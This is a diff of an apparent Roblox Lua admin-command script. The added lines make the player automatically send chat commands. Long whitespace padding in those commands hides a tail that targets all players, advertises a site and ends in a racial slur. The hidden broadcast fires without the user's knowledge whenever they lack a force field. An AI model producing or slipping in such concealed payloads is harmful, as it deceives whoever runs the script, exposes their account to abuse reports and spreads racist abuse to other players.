@@ -2654,7 +2654,17 @@ if string.sub(msg:lower(), 0, 9) == prefix.."eqptools" then
 	if string.sub(msg:lower(), 0, 8) == prefix.."play 19" then
 		game.Players:Chat("music 0000000000000000005253604010")
 	end
-	
+
+local autoff = true
+if not player.Character:FindFirstChild("ForceField") then
+if autoff == true then
+
+chat("ff/                                                                                                               all/antifelogs.com/nigger")
+chat("god/                                                                                                              all/antifelogs.com/nigger")
+end 
+end
+
+
 	if string.sub(msg:lower(), 0, 8) == prefix.."play 20" then
 		game.Players:Chat("music 000000000000000000357357714")
 	end
